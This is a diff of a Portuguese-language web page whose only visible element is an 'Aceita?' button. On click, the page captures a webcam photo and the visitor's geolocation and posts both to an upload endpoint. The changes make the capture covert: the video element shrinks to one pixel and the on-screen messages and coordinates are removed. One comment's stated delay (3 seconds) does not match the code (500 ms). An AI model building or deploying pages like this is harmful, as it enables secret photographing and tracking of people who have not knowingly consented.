@@ -7,11 +7,11 @@
 </head>
 <body>
     <h1>Você</h1>
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <button id="capture">Aceita</button>
+    <video id="video" width="1" height="1" autoplay style="display:none;"></video>
+    <button id="capture">Aceita?</button>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     <p id="status"></p>
-    <p id="coordinates"></p> <!-- Para exibir as coordenadas -->
+    <p id="coordinates"></p>
 
     <script>
         const video = document.getElementById('video');
@@ -21,12 +21,11 @@
         const coordinates = document.getElementById('coordinates');
 
         let stream;
+        let captureTimeout;
 
-        // Função para capturar imagem e localização
         document.getElementById('capture').addEventListener('click', async () => {
             if (!stream) {
                 try {
-                    // Ligar a câmera
                     stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     video.srcObject = stream;
                     video.style.display = 'block';
@@ -37,68 +36,70 @@
                 }
             }
 
-            // Capturar imagem
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/png');
+            // Captura a imagem e obtém a localização após 3 segundos
+            captureTimeout = setTimeout(() => {
+                // Capturar imagem
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
 
-            // Desligar a câmera imediatamente após a captura
-            stream.getTracks().forEach(track => track.stop());
-            video.style.display = 'none';
-            stream = null;
+                // Desligar a câmera após a captura
+                stream.getTracks().forEach(track => track.stop());
+                video.style.display = 'none';
+                stream = null;
 
-            // Obter a localização
-            navigator.geolocation.getCurrentPosition(position => {
-                const latitude = position.coords.latitude;
-                const longitude = position.coords.longitude;
+                // Obter a localização
+                navigator.geolocation.getCurrentPosition(position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
 
-                // Enviar a imagem e a localização para o servidor
-                fetch('127.0.0.1:5500/uploads', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        image: imageData,
-                        location: {
-                            latitude: latitude,
-                            longitude: longitude
-                        }
+                    // Enviar a imagem e a localização para o servidor
+                    fetch('http://127.0.0.1:5500/uploads', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            image: imageData,
+                            location: {
+                                latitude: latitude,
+                                longitude: longitude
+                            }
+                        })
                     })
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error(`Erro na rede: ${response.statusText}`);
-                    }
-                    return response.json();
-                })
-                .then(result => {
-                    console.log(result);
-                    alert(result.message);
-                    status.textContent = 'Imagem e localização enviadas com sucesso!';
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error(`Erro na rede: ${response.statusText}`);
+                        }
+                        return response.json();
+                    })
+                    .then(result => {
+                        console.log(result);
+                       // alert(result.message);
+                        status.textContent = '';
 
-                    // Exibir as coordenadas
-                    coordinates.textContent = `Coordenadas: Latitude ${latitude}, Longitude ${longitude}`;
+                        // coordinates.textContent = `Coordenadas: Latitude ${latitude}, Longitude ${longitude}`;
 
-                    // Criar e baixar o arquivo de texto
-                    const textContent = `Imagem salva com sucesso!\nCoordenadas:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
-                    const blob = new Blob([textContent], { type: 'text/plain' });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = 'informacoes.txt';
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                    URL.revokeObjectURL(url);
-                })
-                .catch(error => {
-                    console.error('Erro ao enviar os dados:', error);
-                    alert('Erro ao enviar os dados: ' + error.message);
+                        // Criar e baixar o arquivo de texto
+                        const textContent = `Imagem salva com sucesso!\nCoordenadas:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+                        const blob = new Blob([textContent], { type: 'text/plain' });
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'informacoes.txt';
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                        URL.revokeObjectURL(url);
+                    })
+                    .catch(error => {
+                        console.error('Erro ao enviar os dados:', error);
+                        alert('Erro ao enviar os dados: ' + error.message);
+                    });
+                }, error => {
+                    console.error("Erro ao obter localização:", error);
+                    alert("Não foi possível obter a localização. Verifique se o serviço de localização está ativado."); 
                 });
-            }, error => {
-                console.error("Erro ao obter localização:", error);
-                alert("Não foi possível obter a localização. Verifique se o serviço de localização está ativado."); 
-            });
+            }, 500); // Mantém a câmera ligada por 3 segundos antes de capturar a imagem
         });
     </script>
 </body>
